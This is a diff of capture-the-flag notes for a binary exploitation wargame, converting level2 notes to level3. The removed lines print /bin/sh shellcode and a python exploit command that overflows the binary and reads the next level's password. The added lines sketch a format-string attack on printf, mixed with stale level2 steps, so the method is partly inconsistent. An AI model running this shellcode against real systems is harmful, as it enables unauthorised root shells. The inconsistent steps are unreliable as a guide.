@@ -1,38 +1,31 @@
 - attack: format string exploitation
-- binary behavior: reprints argument
+- binary behavior: reprints argument, if global argument = 64 run he shell
 - targeted functions: v and main
 - vulnerability in v: printf()
 - defense: fget
 
 Method:
-- find the overflow size
-- find eip offest size
+- find the buffer adress
 - find the return address used by strdup
 - overwrite eip by the return address
 - call shell using shellcode
 - cat passwd when get console with root privedges
-
-Shell code: 52 http://shell-storm.org/shellcode/files/shellcode-863.html
-"\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   
+ 
 Info:
-- 0x0804a008 - return address
-- 0x08a00480 - same in little-endian
-- same in hex - \x08\xa0\x04\x08
+- 0x804988c - global variable
+- 8c980408 - same in little-endian
+- same in hex - \x8c\x98\x04\x08
+
 - eip register address after segfault - 0x37634136
 - its offset - 80 (from wiremask.eu)
 - offset code structure: 80 = 4 (return address) + 52 (shell code) + 28
 
 
 Code:
-objdump -d ./level2
-ltrace ./level2
+objdump -d ./level3
+ltrace ./level3
 
-gdb level2
-(gdb) r <<< Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4
-Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
-(python -c 'print "\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  + "a" * 28 + "\x08\xa0\x04\x08"';cat) | ./level2
-whoami
-cd ..; cat level3/.pass
+cd ..; cat level4/.pass
 
 
 Functions
@@ -61,9 +54,9 @@ Functions
  80484cc:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
  80484d2:       89 04 24                mov    %eax,(%esp)
  80484d5:       e8 b6 fe ff ff          call   8048390 <printf@plt> #exploit for attack
- 80484da:       a1 8c 98 04 08          mov    0x804988c,%eax
- 80484df:       83 f8 40                cmp    $0x40,%eax
- 80484e2:       75 34                   jne    8048518 <v+0x74>
+ 80484da:       a1 8c 98 04 08          mov    0x804988c,%eax 
+ 80484df:       83 f8 40                cmp    $0x40,%eax # compaison of eax with 64
+ 80484e2:       75 34                   jne    8048518 <v+0x74> # if equal to 0 
  80484e4:       a1 80 98 04 08          mov    0x8049880,%eax
  80484e9:       89 c2                   mov    %eax,%edx
  80484eb:       b8 00 86 04 08          mov    $0x8048600,%eax
@@ -76,7 +69,7 @@ Functions
  8048507:       e8 a4 fe ff ff          call   80483b0 <fwrite@plt>
  804850c:       c7 04 24 0d 86 04 08    movl   $0x804860d,(%esp)
  8048513:       e8 a8 fe ff ff          call   80483c0 <system@plt> #exploit for shell
- 8048518:       c9                      leave
+ 8048518:       c9                      leave # jump here if 0
  8048519:       c3                      ret
 
              
